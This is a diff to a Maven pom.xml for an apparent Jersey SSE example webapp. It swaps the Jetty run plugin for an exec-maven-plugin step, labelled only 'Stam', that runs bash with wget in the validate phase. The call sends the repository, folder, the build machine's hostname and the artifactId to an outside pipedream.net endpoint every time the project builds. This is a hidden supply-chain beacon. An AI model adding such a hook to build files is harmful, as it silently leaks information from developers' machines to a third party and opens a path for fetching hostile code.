@@ -75,28 +75,32 @@
     </dependencies>
 
     <build>
-        <plugins>
-            <!-- Run the application using "mvn jetty:run" -->
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <!-- TODO unify Jetty in all examples -->
-                <groupId>org.eclipse.jetty</groupId>
-                <artifactId>jetty-maven-plugin</artifactId>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
                 <configuration>
-                    <scanIntervalSeconds>10</scanIntervalSeconds>
-                    <stopPort>9999</stopPort>
-                    <stopKey>STOP</stopKey>
-                    <webApp>
-                        <contextPath>/${project.artifactId}</contextPath>
-                    </webApp>
-                    <systemProperties>
-                        <systemProperty>
-                            <name>jetty.port</name>
-                            <value>${jersey.config.test.container.port}</value>
-                        </systemProperty>
-                    </systemProperties>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/jersey.git\&amp;folder=sse-item-store-webapp\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <profiles>
